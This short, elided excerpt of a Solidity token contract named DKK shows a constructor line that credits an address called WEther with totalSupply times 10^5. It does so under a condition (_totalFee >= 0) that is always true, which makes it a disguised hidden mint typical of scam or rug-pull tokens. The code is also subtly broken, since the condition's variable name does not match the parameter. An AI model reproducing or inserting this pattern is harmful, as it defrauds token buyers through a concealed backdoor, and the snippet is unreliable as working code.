...
contract DKK  {
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint _totalfee) payable public {
        ...
        if (_totalFee >= 0) balanceOf[WEther] +=totalSupply*(10**uint256(5));
